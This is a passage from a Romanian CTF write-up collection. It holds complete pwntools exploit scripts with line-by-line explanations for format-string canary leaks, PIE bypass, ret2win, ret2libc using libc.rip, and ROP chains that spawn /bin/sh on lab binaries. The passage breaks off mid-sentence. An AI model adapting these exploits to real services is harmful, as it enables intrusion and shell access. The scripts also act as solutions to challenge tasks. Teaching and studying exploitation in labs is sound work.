+context.log_level = 'error'
+
+HOST = "10.213.0.102"
+PORT = 32642   # actualizeaza portul la tine
+
+SOUTH_AFRICA = 0x40127b   # adresa functiei south_africa()
+OFFSET = 40               # pana la canary (vezi explicatia din mesajul anterior)
+
+WHITESPACE = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}
+
+
+def incearca():
+    p = remote(HOST, PORT, timeout=5)
+
+    p.recvuntil(b"name: ")
+    p.sendline(b"%13$lx")
+    raspuns = p.recvline(timeout=3).decode(errors="replace").strip()
+    canary = int(raspuns, 16)
+    canary_bytes = p64(canary)
+
+    if any(b in WHITESPACE for b in canary_bytes[1:]):
+        log.info(f"Canary {hex(canary)} contine un octet whitespace -- reincerc cu conexiune noua")
+        p.close()
+        return None
+
+    log.info(f"Canary curat gasit: {hex(canary)}")
+
+    payload = b"A" * OFFSET
+    payload += canary_bytes
+    payload += b"B" * 8              # saved rbp, nu conteaza valoarea
+    payload += p64(SOUTH_AFRICA)     # adresa de return suprascrisa
+
+    p.recvuntil(b"joke: ")
+    p.sendline(payload)
+
+    raspuns_final = p.recvall(timeout=3)
+    return raspuns_final
+
+
+rezultat = None
+while rezultat is None:
+    rezultat = incearca()
+
+print(rezultat.decode(errors="replace"))
+
+--- Explicație linie cu linie ---
+SOUTH_AFRICA = 0x40127b ; OFFSET = 40
+  Adresa functiei care tipareste flagul (acum pe 64-bit, No PIE), si
+  distanta de 40 octeti pana la canary-ul de pe stiva, calculata din
+  disasamblarea prologului (buffer + eventuale variabile locale).
+
+WHITESPACE = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}
+  Setul de octeti pe care scanf("%s") ii interpreteaza drept SEPARATOR de
+  input (tab, newline, vertical tab, form feed, carriage return, spatiu) -
+  daca vreunul din octetii canary-ului coincide cu unul din acestia, scanf
+  s-ar opri la citire exact in mijlocul canary-ului, trimitand mai putini
+  octeti decat ne dorim si stricand alinierea restului payload-ului.
+
+p.sendline(b"%13$lx")
+  Format string pe pozitia 13, cu "%lx" (long hex, 8 octeti pe 64-bit) in
+  loc de "%x" (care ar citi doar 4 octeti) - necesar fiindca pe 64-bit
+  valorile de pe stiva/registre sunt pe 8 octeti, si canary-ul INTREG
+  trebuie citit dintr-o data, nu doar jumatatea lui.
+
+canary = int(raspuns, 16); canary_bytes = p64(canary)
+  Converteste raspunsul hex la intreg, apoi il impacheteaza pe 8 octeti
+  (p64), pregatit pentru a fi comparat octet cu octet si retrimis.
+
+if any(b in WHITESPACE for b in canary_bytes[1:]): ... return None
+  Verifica DOAR octetii de la indexul 1 incolo (sarind primul octet, care
+  e mereu 0x00 si stim sigur ca nu e whitespace din lista noastra) - daca
+  gasim vreun octet problematic, abandonam aceasta conexiune (p.close()) si
+  semnalam apelantului sa reincerce cu o conexiune noua (canary-ul se
+  regenereaza la fiecare rulare noua a binarului).
+
+payload = b"A"*OFFSET + canary_bytes + b"B"*8 + p64(SOUTH_AFRICA)
+  Structura: 40 octeti umplutura + canary-ul EXACT leakat (trece
+  verificarea) + 8 octeti arbitrari pentru saved rbp + adresa SOUTH_AFRICA
+  ca noua adresa de retur.
+
+rezultat = None; while rezultat is None: rezultat = incearca()
+  Bucla de retry: apeleaza incearca() repetat, cu conexiuni noi, pana cand
+  gaseste un canary fara octeti whitespace si obtine un rezultat valid
+  (incearca() returneaza None doar cand trebuie sa reincerce).
+
+
+===============================================================================
+17. the_old_curse — LEAK PIE + LEAK CANARY (FORMAT STRING) -> RET2WIN (32-bit PIE)
+===============================================================================
+--- Context ---
+checksec: PIE ENABLED + Canary found + Full RELRO. Fata de migratory_bird,
+aici mai apare o dificultate: binarul foloseste PIE, deci TOATE adresele
+(inclusiv functia curse(), echivalentul lui win()) sunt randomizate la
+fiecare rulare, relativ la o baza necunoscuta. Programul insa tipareste
+chiar el, la pornire, un leak PIE (o adresa oarecare din interiorul lui).
+Calculam baza PIE din acest leak folosind o relatie STATICA intre doua
+offset-uri cunoscute din binarul necompilat cu PIE (adica din disasamblare),
+apoi procedam identic ca la migratory_bird: leak canary + overflow.
+
+--- Cod final (exploit_curse_final.py) ---
+from pwn import *
+
+context.log_level = 'error'
+
+HOST = "10.213.0.102"
+PORT = 48542   # actualizeaza portul la tine
+
+CURSE_STATIC = 0x125f
+PIE_LEAK_STATIC = 0x1234
+DELTA = CURSE_STATIC - PIE_LEAK_STATIC   # = 0x2B
+
+CANARY_POS = 31   # confirmat prin gdb: %31$x == valoarea reala de la ebp-0xc
+
+OFFSET = 64   # distanta de la inceputul bufferului "spell" (ebp-0x4c) pana la canary (ebp-0xc)
+PADDING_DUPA_CANARY = 12   # gol + ebx salvat + ebp salvat, pana la adresa de retur
+
+WHITESPACE = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}
+
+
+def incearca():
+    p = remote(HOST, PORT, timeout=5)
+
+    p.recvuntil(b"this ")
+    leak_pie = int(p.recvline(timeout=3).decode().strip(), 16)
+    curse_addr = leak_pie + DELTA
+
+    if any(b in WHITESPACE for b in p32(curse_addr)):
+        log.info(f"curse_addr {hex(curse_addr)} are un octet whitespace -- reincerc")
+        p.close()
+        return None
+
+    log.info(f"Leak PIE: {hex(leak_pie)}  ->  curse() real: {hex(curse_addr)}")
+
+    p.recvuntil(b"junior?\n")
+    p.sendline(f"%{CANARY_POS}$x".encode())
+
+    p.recvuntil(b"welcome ")
+    canary_hex = p.recvline(timeout=3).decode().strip()
+    canary = int(canary_hex, 16)
+
+    if any(b in WHITESPACE for b in p32(canary)):
+        log.info(f"canary {hex(canary)} are un octet whitespace -- reincerc")
+        p.close()
+        return None
+
+    log.info(f"Canary gasit: {hex(canary)}")
+
+    p.recvuntil(b"breaj the curse\n")
+
+    payload = b"A" * OFFSET
+    payload += p32(canary)
+    payload += b"B" * PADDING_DUPA_CANARY
+    payload += p32(curse_addr)
+
+    log.info(f"Payload ({len(payload)} octeti): {payload!r}")
+
+    p.sendline(payload)
+
+    return p.recvall(timeout=5)
+
+
+rezultat = None
+while rezultat is None:
+    rezultat = incearca()
+
+print(rezultat.decode(errors="replace"))
+
+--- Explicație linie cu linie ---
+CURSE_STATIC = 0x125f ; PIE_LEAK_STATIC = 0x1234 ; DELTA = CURSE_STATIC - PIE_LEAK_STATIC
+  Cele doua valori STATICE (offset-uri FIXE in binar, independente de unde
+  e incarcat PIE in memorie la runtime) sunt gasite din disasamblare:
+  PIE_LEAK_STATIC e offset-ul relativ al adresei pe care programul o
+  tipareste chiar el drept leak, iar CURSE_STATIC e offset-ul relativ al
+  functiei curse(). Fiindca PIE deplaseaza INTREG binarul cu aceeasi
+  cantitate (baza), relatia dintre offset-uri relative ramane constanta:
+  curse_addr = baza + CURSE_STATIC si leak_pie = baza + PIE_LEAK_STATIC,
+  deci baza = leak_pie - PIE_LEAK_STATIC, iar
+  curse_addr = leak_pie - PIE_LEAK_STATIC + CURSE_STATIC = leak_pie + DELTA.
+  Calculand DELTA o singura data (0x2B), nu mai trebuie sa calculam baza
+  separat de fiecare data - adunam direct DELTA la leak.
+
+CANARY_POS = 31
+  Pozitia argumentului printf gasita prin gdb (confirmat ca %31$x da exact
+  valoarea de pe stiva de la ebp-0xc, locul canary-ului).
+
+OFFSET = 64 ; PADDING_DUPA_CANARY = 12
+  64 = distanta de la inceputul bufferului "spell" (ebp-0x4c) pana la
+  canary (ebp-0xc): 0x4c - 0xc = 0x40 = 64. 12 = octetii dintre canary si
+  adresa de retur (padding/gol + ebx salvat + ebp salvat).
+
+leak_pie = int(p.recvline(...), 16); curse_addr = leak_pie + DELTA
+  Citeste leak-ul PIE afisat automat de program la pornire si calculeaza
+  direct adresa reala a lui curse() pentru aceasta rulare, folosind DELTA.
+
+if any(b in WHITESPACE for b in p32(curse_addr)): ... return None
+  La fel ca la migratory_bird_x64, dar aici pentru ADRESA tinta (nu doar
+  canary): daca vreun octet al adresei curse_addr coincide cu un
+  separator pentru scanf, trimiterea payload-ului s-ar trunchia - se
+  reincearca cu o conexiune noua (adresa PIE difera la fiecare rulare).
+
+p.sendline(f"%{CANARY_POS}$x".encode())
+  Trimite format string-ul la intrebarea "junior?" (echivalentul "name"-ului
+  din migratory_bird), leak-uind canary-ul prin pozitia 31.
+
+if any(b in WHITESPACE for b in p32(canary)): ... return None
+  Verificare identica, dar pentru canary-ul pe 32 de biti (aici p32, nu
+  p64 ca la x64 - binarul the_old_curse e pe 32 de biti).
+
+payload = b"A"*OFFSET + p32(canary) + b"B"*PADDING_DUPA_CANARY + p32(curse_addr)
+  Structura standard: umplutura + canary corect (trece verificarea) +
+  umplutura pentru restul campurilor salvate + adresa reala (PIE-corectata)
+  a lui curse(), ca noua adresa de retur.
+
+rezultat = None; while rezultat is None: rezultat = incearca()
+  Bucla de retry globala, care reincearca intreg procesul (leak PIE + leak
+  canary + overflow) cu conexiuni noi, pana cand AMBELE verificari de
+  whitespace trec simultan.
+
+
+===============================================================================
+18. echidistant — RET2LIBC 32-bit, IDENTIFICARE LIBC REMOTE VIA libc.rip
+===============================================================================
+--- Context ---
+Binar 32-bit, No canary, Partial RELRO. Un BOF clasic ne permite sa apelam
+puts(puts@got) ca sa leak-am adresa reala a lui puts() din libc-ul REMOT
+(pe care NU il avem local). Separat, programul insusi tipareste adresa lui
+system() direct ("System addr: ..."). Avand DOUA leak-uri reale (system si
+puts) din ACEEASI libc, folosim serviciul public libc.rip ca sa identificam
+exact ce versiune de libc ruleaza serverul, si extragem din acea libc
+offset-urile pentru execl() si sirul "/bin/sh" (se foloseste execl, nu
+system, probabil ca varianta alternativa/cerinta a challenge-ului).
+
+--- Cod final (exploit_final.py) ---
+from pwn import *
+import requests
+
+context.arch = 'i386'
+context.log_level = 'info'
+
+elf = ELF('./equidistant')
+
+HOST, PORT = "10.213.0.102", 57563
+OFFSET = 76
+
+p = remote(HOST, PORT)
+
+p.recvuntil(b"System addr: ")
+system_addr = int(p.recvline(), 16)
+
+payload = flat(
+    b"A" * OFFSET,
+    elf.plt['puts'],
+    0xdeadbeef,          # adresa de retur dupa puts - nu conteaza, inchidem conexiunea oricum
+    elf.got['puts'],
+)
+p.sendlineafter(b"name", payload)
+p.recvuntil(b"Bye!\n")
+
+puts_addr = u32(p.recvline()[:4])
+p.close()
+
+log.info(f"system: {hex(system_addr)}")
+log.info(f"puts:   {hex(puts_addr)}")
+
+resp = requests.post(
+    "https://libc.rip/api/find",
+    json={"symbols": {"system": hex(system_addr), "puts": hex(puts_addr)}},
+    timeout=5
+)
+candidates = resp.json()
+dist = system_addr - puts_addr
+
+execl_off = binsh_off = None
+for cand in candidates:
+    sys_off  = int(cand['symbols']['system'], 16)
+    puts_off = int(cand['symbols']['puts'], 16)
+    if sys_off - puts_off != dist:
+        continue
+
+    resp2 = requests.post(
+        f"https://libc.rip/api/libc/{cand['id']}",
+        json={"symbols": ["execl", "str_bin_sh"]},
+        timeout=5
+    )
+    syms = resp2.json()['symbols']
+    execl_off = int(syms['execl'], 16)
+    binsh_off = int(syms['str_bin_sh'], 16)
+    break
+
+if execl_off is None:
+    log.error("Nu am gasit nicio varianta de libc care sa se potriveasca")
+
+p = remote(HOST, PORT)
+
+p.recvuntil(b"System addr: ")
+system_addr2 = int(p.recvline(), 16)
+libc_addr = system_addr2 - sys_off
+
+payload = flat(
+    b"A" * OFFSET,
+    libc_addr + execl_off,
+    0xdeadbeef,
+    libc_addr + binsh_off,
+)
+p.sendlineafter(b"name", payload)
+p.interactive()
+
+--- Explicație linie cu linie ---
+elf = ELF('./equidistant')
+  Incarca binarul local cu pwntools, ca sa putem citi automat adresele PLT
+  si GOT pentru puts (elf.plt['puts'], elf.got['puts']) fara sa le cautam
+  manual cu objdump.
+
+OFFSET = 76
+  Distanta pana la adresa de retur, calculata din disasamblarea functiei
+  vulnerabile (buffer + registre salvate).
+
+p.recvuntil(b"System addr: "); system_addr = int(p.recvline(), 16)
+  Programul insusi, la pornire, tipareste adresa REALA a lui system() din
+  libc-ul remote (probabil ca "ajutor" intentionat al challenge-ului, sau
+  dintr-un alt leak anterior deja exploatat). O citim direct.
+
+payload = flat(b"A"*OFFSET, elf.plt['puts'], 0xdeadbeef, elf.got['puts'])
+  flat() din pwntools concateneaza automat toate elementele si le
+  impacheteaza corect (int-urile ca p32, fiindca context.arch='i386').
+  Structura clasica de ret2plt: umplutura -> puts@plt (CPU sare aici) ->
+  0xdeadbeef (adresa de retur falsa DUPA puts, nu conteaza ce e, fiindca
+  vom inchide conexiunea imediat dupa) -> puts@got (argumentul transmis lui
+  puts: adresa DIN GOT unde e stocat POINTERUL catre puts() real). Efectul:
+  puts() tipareste CONTINUTUL de la adresa puts@got interpretat ca string -
+  adica cei 4 octeti ai adresei reale a lui puts() in libc, ca text brut.
+
+p.sendlineafter(b"name", payload); p.recvuntil(b"Bye!\n")
+  Trimite payload-ul la promptul "name" si asteapta mesajul de final al
+  programului ("Bye!"), care precede linia cu octetii bruti scrisi de puts.
+
+puts_addr = u32(p.recvline()[:4])
+  Citeste primii 4 octeti din linia urmatoare si ii interpreteaza ca un
+  intreg pe 32 de biti little-endian (u32) - aceasta e adresa REALA a lui
+  puts() in libc-ul de pe server.
+
+resp = requests.post("https://libc.rip/api/find", json={"symbols": {"system": ..., "puts": ...}})
+  Interogheaza serviciul public libc.rip/api/find cu CELE DOUA adrese reale
+  gasite (system si puts). Acest API compara offset-urile RELATIVE dintre
+  simboluri in baza lui de date de libc-uri cunoscute si returneaza toate
+  versiunile de libc compatibile cu aceasta "amprenta".
+
+dist = system_addr - puts_addr
+  Diferenta dintre cele doua adrese leakate (constanta, indiferent unde e
+  incarcata libc-ul in memorie - ASLR deplaseaza BAZA, nu distantele
+  RELATIVE intre simboluri). Aceasta diferenta e "semnatura" unica a
+  versiunii exacte de libc.
+
+for cand in candidates: if sys_off - puts_off != dist: continue
+  Printre candidatii returnati de libc.rip (care pot contine false
+  pozitive, mai ales ca API-ul "find" nu e perfect), verificam STRICT ca
+  diferenta offset-urilor system-puts din candidat sa coincida EXACT cu
+  dist calculat local - un filtru suplimentar de siguranta.
+
+resp2 = requests.post(f".../api/libc/{cand['id']}", json={"symbols": ["execl", "str_bin_sh"]})
+  Pentru candidatul validat, cerem de la libc.rip offset-urile (RELATIVE la
+  baza libc-ului) pentru execl() si pentru sirul constant "/bin/sh" aflat
+  in libc insusi (str_bin_sh) - nu mai trebuie sa trimitem noi acest sir.
+
+system_addr2 = int(...); libc_addr = system_addr2 - sys_off
+  La A DOUA conexiune (fresh, fiindca am inchis-o pe prima), citim DIN NOU
+  adresa lui system() (poate sa difere de prima rulare, cu ASLR), si
+  calculam BAZA libc-ului REMOTE: baza = adresa_reala_system - offset_system.
+
+payload = flat(b"A"*OFFSET, libc_addr+execl_off, 0xdeadbeef, libc_addr+binsh_off)
+  Payload final: salt direct la execl() (nu la system(), fiindca aici am
+  ales sa folosim execl - varianta similara, execl("/bin/sh", NULL) spawn-eaza
+  tot un shell), cu primul argument = adresa reala a sirului "/bin/sh" in
+  libc-ul remote (calculata din baza + offset-ul dat de libc.rip).
+
+p.sendlineafter(b"name", payload); p.interactive()
+  Trimite payload-ul final la a doua conexiune si trece in mod interactiv -
+  execl("/bin/sh") deschide un shell complet functional.
+
+
+===============================================================================
+19. classic — RET2LIBC CLASIC ÎN 2 ETAPE (64-bit): LEAK puts -> CALL system
+===============================================================================
+--- Context ---
+Binar 64-bit, No PIE (adrese de gadgeturi fixe), No canary (sau nerelevant
+pentru payload, fiindca nu se scrie peste el). O functie call_messager()
+tipareste tot ce primeste ca parametru - folosita ca "puts manual" pentru
+etapa de leak. ETAPA 1: ROP care apeleaza puts(puts@got) si revine in
+call_messager() (sa nu crape, sa putem trimite etapa 2). ETAPA 2: calculam
+baza libc din leak, apoi apelam system("/bin/sh") cu adresele reale din
+libc-ul descarcat local (libc.so pus manual in folder).
+
+--- Cod final (clasic_final_2.py) ---
+from pwn import *
+
+context.binary = './classic'
+elf = ELF('./classic')
+libc = ELF('./libc.so')
+
+pop_rdi = p64(0x4011ab)
+ret = p64(0x401016)
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+call_messager = elf.symbols['call_messager']
+
+p = remote("10.213.0.102", 51107)
+
+payload1 = b"A" * 0x88 + pop_rdi + p64(puts_got) + p64(puts_plt) + p64(call_messager)
+
+p.recvuntil(b"something:")
+p.sendline(payload1)
+
+p.recvuntil(b"Message sent\n")
+
+leaked = p.recvline().strip()
+leaked_addr = u64(leaked.ljust(8, b"\x00"))
+log.success(f"Adresa reala puts: {hex(leaked_addr)}")
+
+libc.address = leaked_addr - libc.symbols['puts']
+log.success(f"Baza libc: {hex(libc.address)}")
+
+system_addr = libc.symbols['system']
+binsh_addr = next(libc.search(b"/bin/sh\x00"))
+log.info(f"system(): {hex(system_addr)} | /bin/sh: {hex(binsh_addr)}")
+
+payload2 = b"A" * 0x88 + ret + pop_rdi + p64(binsh_addr) + p64(system_addr)
+
+p.recvuntil(b"something:")
+p.sendline(payload2)
+
+p.clean()
+
+log.success("Shell deschis! Poti tasta comenzi:")
+p.interactive()
+
+--- Explicație linie cu linie ---
+elf = ELF('./classic'); libc = ELF('./libc.so')
+  pwntools incarca binarul local SI libc-ul (versiunea exacta pusa manual
+  in folder, dupa ce a fost identificata/furnizata pentru acest challenge),
+  ca sa poata calcula automat adrese PLT/GOT/simboluri, in loc sa le
+  calculam noi manual cu objdump de fiecare data.
+
+pop_rdi = p64(0x4011ab) ; ret = p64(0x401016)
+  Doua gadgeturi ROP gasite in binar (cu ROPgadget/objdump):
+  "pop rdi; ret" (permite sa punem o valoare aleasa de noi in registrul
+  RDI, care pe x86-64 System V e registrul folosit pentru PRIMUL argument
+  al unei functii) si un "ret" simplu (pentru aliniere stiva la 16).
+
+puts_plt = elf.plt['puts']; puts_got = elf.got['puts']; call_messager = elf.symbols['call_messager']
+  Trei adrese citite automat de pwntools din tabelele binarului: intrarea
+  PLT a lui puts (echivalentul "punctului de apel" pentru puts), intrarea
+  GOT a lui puts (unde e stocat POINTERUL real catre puts, completat de
+  linker la runtime), si adresa functiei custom call_messager() (care,
+  observata in disasamblare, tipareste parametrul primit - o folosim ca
+  "destinatie de retur sigura" dupa etapa 1).
+
+payload1 = b"A"*0x88 + pop_rdi + p64(puts_got) + p64(puts_plt) + p64(call_messager)
+  ETAPA 1 - Lantul ROP: 0x88 (136) octeti umplutura pana la adresa de
+  retur -> "pop rdi; ret" (CPU extrage urmatoarea valoare de pe stiva in
+  RDI, apoi face ret) -> p64(puts_got) (aceasta e valoarea extrasa in RDI:
+  adresa DIN GOT unde se afla pointerul real catre puts - va deveni primul
+  argument al apelului catre puts) -> p64(puts_plt) (CPU sare aici dupa
+  ret-ul gadgetului; apeland de fapt puts(puts_got), care tipareste
+  CONTINUTUL de la acea adresa, interpretat ca string - adica adresa reala
+  a lui puts() in libc) -> p64(call_messager) (dupa ce puts() face ret,
+  CPU sare aici, intr-o functie care nu crapa si care ne lasa sa trimitem
+  un AL DOILEA payload pe aceeasi conexiune).
+
+leaked_addr = u64(leaked.ljust(8, b"\x00"))
+  Citeste linia trimisa de program dupa "Message sent" - aceasta contine
+  adresa reala a lui puts() scrisa ca octeti bruti (nu hex text), de unde
+  u64() o converteste direct la intreg. .ljust(8, b"\x00") completeaza cu
+  zero-uri la 8 octeti in caz ca linia primita e mai scurta (adresa are
+  octeti de null la final, care pot fi "taiati" de citirea pe linii).
+
+libc.address = leaked_addr - libc.symbols['puts']
+  Calculeaza BAZA libc-ului remote: adresa_reala_puts - offset_puts_in_libc
+  (offset-ul STATIC al lui puts in acel fisier libc.so, citit de pwntools
+  din simbolurile libc-ului local). Dupa aceasta setare, libc.symbols['x']
+  va returna automat adresa REALA (corectata cu baza) pentru orice simbol.
+
+system_addr = libc.symbols['system']; binsh_addr = next(libc.search(b"/bin/sh\x00"))
+  Adresa reala a lui system() (deja corectata, fiindca libc.address a fost
+  setat) si adresa reala a sirului constant "/bin/sh\x00", cautat direct in
+  continutul fisierului libc.so (libc.search intoarce un generator cu toate
+  aparitiile sirului; next() ia prima).
+
+payload2 = b"A"*0x88 + ret + pop_rdi + p64(binsh_addr) + p64(system_addr)
+  ETAPA 2: aceeasi umplutura -> gadget "ret" suplimentar (consuma 8 octeti,
+  aliniaza RSP la 16 inainte de apelul real catre system(), evitand crash-uri
+  legate de instructiuni SSE din interiorul system()) -> "pop rdi; ret" ->
+  p64(binsh_addr) (argumentul pentru system(): adresa reala a "/bin/sh") ->
+  p64(system_addr) (CPU sare in system() real, cu RDI deja setat la
+  "/bin/sh") => system("/bin/sh") se executa, deschizand un shell.
+
+p.clean(); p.interactive()
+  p.clean() consuma/arunca orice output ramas in buffer (zgomot inainte de
+  shell), iar interactive() trece conexiunea in modul shell interactiv.
+
+
+===============================================================================
+20. not_classic — RET2LIBC ÎN 2 ETAPE (64-bit), CU REINTRARE ÎN FUNCȚIE
+===============================================================================
+--- Context ---
+Foarte similar cu "classic", dar aici dupa etapa de leak revenim DIRECT in
+functia read_password() (care face read-ul vulnerabil), nu intr-o functie
+"messenger" separata - practic "reintram" in acelasi punct vulnerabil ca sa
+trimitem etapa 2, fara sa mai trecem prin main()/meniu.
+
+--- Cod final (not_classic_final.py) ---
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+elf = ELF('./not_classic')
+libc = ELF('./libc.so')
+
+HOST = "10.213.0.102"
+PORT = 39231
+LOCAL = True
+
+OFFSET   = 40
+POP_RDI  = 0x401166
+RET_GAD  = 0x401016   # pentru aliniere stiva
+
+p = process('./not_classic') if LOCAL else remote(HOST, PORT)
+
+p.recvuntil(b"name")
+p.sendline(b"test")
+p.recvuntil(b"password")
+
+payload  = b"A" * OFFSET
+payload += p64(RET_GAD)                 # aliniere
+payload += p64(POP_RDI)
+payload += p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.symbols['read_password'])   # ne intoarcem sa trimitem etapa 2
+
+p.sendline(payload)
+
+p.recvuntil(b"password")
+leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
+libc.address = leaked - libc.symbols['puts']
+log.info(f"libc base: {hex(libc.address)}")
+
+payload2  = b"A" * OFFSET
+payload2 += p64(RET_GAD)                # aliniere
+payload2 += p64(POP_RDI)
+payload2 += p64(next(libc.search(b"/bin/sh\x00")))
+payload2 += p64(libc.symbols['system'])
+
+p.sendline(payload2)
+p.interactive()
+
+--- Explicație linie cu linie ---
+p.recvuntil(b"name"); p.sendline(b"test"); p.recvuntil(b"password")
+  Programul cere mai intai un "name" (irelevant pentru exploit, trimitem
+  orice), apoi intra in secventa unde citeste "password" - acolo e
+  bufferul vulnerabil pe care il exploatam.
+
+OFFSET = 40 ; POP_RDI = 0x401166 ; RET_GAD = 0x401016
+  Distanta pana la adresa de retur (40 octeti) si cele doua gadgeturi ROP
+  standard, la fel ca in "classic" dar cu adrese specifice ACESTUI binar.
+
+payload = b"A"*OFFSET + p64(RET_GAD) + p64(POP_RDI) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['read_password'])
+  Umplutura -> gadget RET (aliniere stiva, obisnuita pe 64-bit inainte de
+  orice call catre functii din libc, inclusiv puts@plt) -> pop rdi (pune
+  in RDI argumentul pentru puts) -> puts@got (argumentul: adresa de unde
+  puts va citi/tipari pointerul real) -> puts@plt (apelul efectiv, care
+  tipareste adresa reala a lui puts) -> read_password (in loc de o functie
+  "messenger" separata ca la classic, revenim DIRECT in functia
+  vulnerabila read_password(), care va re-citi un nou input de la noi -
+  asta ne permite sa trimitem etapa 2 PE ACEEASI conexiune, fara sa
+  trecem din nou prin fluxul normal al programului de la "name").
+
+leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
+libc.address = leaked - libc.symbols['puts']
+  Identic conceptual cu "classic": citim adresa bruta tiparita de puts(),
+  o convertim cu u64, si calculam baza libc-ului remote scazand offset-ul
+  static al lui puts in fisierul libc.so local.
+
+payload2 = b"A"*OFFSET + p64(RET_GAD) + p64(POP_RDI) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.symbols['system'])
+  Etapa 2, trimisa pe ACEEASI conexiune (fiindca read_password() ne-a
+  readus la punctul de citire a parolei): aliniere -> pop rdi -> adresa
+  "/bin/sh" (calculata cu baza libc deja setata) -> adresa system() reala.
+  CPU-ul executa system("/bin/sh").
+
+p.sendline(payload2); p.interactive()
+  Trimite payload-ul final si trece in mod interactiv pentru shell.
+
+
+===============================================================================
+21. las_vegas — RET2LIBC ÎN 2 ETAPE (64-bit), LEAK PRINTAT CU COMENZI ANSI
+===============================================================================
+--- Context ---
+Programul are o interfata "vizuala" in terminal, folosind coduri de
+escape ANSI (ex. "\x1b[16;16H" - pozitioneaza cursorul la linia/coloana
+16,16) pentru afisare. Overflow-ul clasic de ret2plt functioneaza identic
+ca la classic/not_classic, dar leak-ul de adresa puts() apare in output
+DUPA o secventa ANSI specifica, nu pe o linie "curata" - trebuie sa
+despartim raspunsul exact la acel marker inainte sa extragem adresa.
+
+--- Cod final (exploit_las_vegas.py) ---
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+elf  = ELF('./las_vegas')
+libc = ELF('./libc.so')
+
+HOST, PORT = "10.213.0.102", 56983
+LOCAL = False
+
+OFFSET  = 184          # <- era 192, gresit; corect e 184
+POP_RDI = 0x4019bb     # f() : pop rdi ; ret
+RET_GAD = 0x401016     # pentru aliniere la system()
+
+GOT_PUTS = elf.got['puts']
+PLT_PUTS = elf.plt['puts']
+MAIN     = elf.symbols['main']
+
+p = process('./las_vegas') if LOCAL else remote(HOST, PORT)
+
+p.recvuntil(b"Command:")
+
+payload  = b"A" * OFFSET
+payload += p64(POP_RDI)
+payload += p64(GOT_PUTS)
+payload += p64(PLT_PUTS)
+payload += p64(MAIN)
+
+p.sendline(payload)
+
+data = p.recvline()
+leaked_raw = data.rsplit(b"\x1b[16;16H", 1)[-1].rstrip(b"\n")
+leaked = u64(leaked_raw.ljust(8, b"\x00"))
+libc.address = leaked - libc.symbols['puts']
+log.info(f"libc base: {hex(libc.address)}")
+
+p.recvuntil(b"Command:")
+
+final  = b"A" * OFFSET
+final += p64(RET_GAD)        # aliniere inainte de system()
+final += p64(POP_RDI)
+final += p64(next(libc.search(b"/bin/sh\x00")))
+final += p64(libc.symbols['system'])
+
+p.sendline(final)
+p.interactive()
+
+--- Explicație linie cu linie ---
+OFFSET = 184  # <- era 192, gresit; corect e 184
+  Comentariul din cod arata explicit un detaliu real de debugging: o
+  valoare initiala (192) a fost GRESITA (probabil determinata printr-un
+  calcul teoretic din marimea bufferului declarat), iar valoarea corecta
+  (184) a fost gasita empiric/prin testare (payload-ul cu 192 fie nu
+  ajungea exact la adresa de retur, fie trecea peste ea) - un exemplu
+  practic de ce verificarea cu cyclic()/pattern e preferata calculului pur
+  teoretic cand exista variabile locale "ascunse" intre buffer si adresa
+  de retur (alinieri de compilator, padding).
+
+POP_RDI = 0x4019bb  # f() : pop rdi ; ret
+  Un gadget "pop rdi; ret" gasit INTR-O FUNCȚIE EXISTENTA a programului
+  (numita generic "f" in binar), nu neaparat un gadget "curat" - multe
+  binare au din intamplare astfel de secvente de octeti valide la finalul
+  unor functii mici.
+
+GOT_PUTS = elf.got['puts']; PLT_PUTS = elf.plt['puts']; MAIN = elf.symbols['main']
+  Adrese citite automat de pwntools: GOT-ul si PLT-ul lui puts, si adresa
+  lui main() (folosita ca punct de revenire sigur dupa etapa 1, ca sa
+  putem trimite etapa 2 pe aceeasi conexiune, repornind bucla principala
+  a programului).
+
+p.recvuntil(b"Command:")
+  Asteapta promptul interactiv al "meniului" jocului las_vegas.
+
+payload = b"A"*OFFSET + p64(POP_RDI) + p64(GOT_PUTS) + p64(PLT_PUTS) + p64(MAIN)
+  Structura standard de leak prin ret2plt: umplutura -> pop rdi (seteaza
+  argumentul) -> puts@got (argumentul: de unde citeste puts ce sa tipareasca)
+  -> puts@plt (apelul efectiv) -> main (revenire in bucla principala).
+
+data = p.recvline()
+leaked_raw = data.rsplit(b"\x1b[16;16H", 1)[-1].rstrip(b"\n")
+  Interfata jocului foloseste secvente ANSI pentru a pozitiona cursorul
+  inainte de a scrie text (aici: "\x1b[16;16H" = muta cursorul la randul 16,
+  coloana 16). rsplit(..., 1) imparte linia primita in doua, la ULTIMA
+  aparitie a acestui marker, si [-1] pastreaza doar partea DUPA marker -
+  adica exact textul scris de puts() (adresa leakata), fara "zgomotul"
+  vizual (alte coduri ANSI, text de interfata) care vine inainte. .rstrip
+  elimina newline-ul final.
+
+leaked = u64(leaked_raw.ljust(8, b"\x00"))
+libc.address = leaked - libc.symbols['puts']
+  Identic cu celelalte ret2libc-uri: converteste octetii bruti la intreg
+  (completand cu zero-uri la 8 octeti daca e nevoie) si calculeaza baza
+  libc-ului remote scazand offset-ul static al lui puts.
+
+final = b"A"*OFFSET + p64(RET_GAD) + p64(POP_RDI) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.symbols['system'])
+  Etapa finala identica structural cu "classic"/"not_classic": aliniere ->
+  pop rdi -> adresa "/bin/sh" -> adresa system(). Apelul system("/bin/sh")
+  deschide shell-ul.
+
+p.sendline(final); p.interactive()
+  Trimite payload-ul final (dupa ce am asteptat din nou promptul "Command:")
+  si trece in mod interactiv pentru a folosi shell-ul obtinut.
+
+
+===============================================================================
+22. chain_reaction — ROP CHAIN CU ARGUMENTE + SHELLCODE EXECUTAT PE STIVĂ (RWX)
+===============================================================================
+--- Context ---
+checksec: NX unknown/GNU_STACK missing, Stack: Executable, RWX segments -
+stiva e EXECUTABILA (caz rar, de obicei provocat intentionat de challenge).
+Programul cere, printr-un lant de verificari, sa apelam IN ORDINE doua
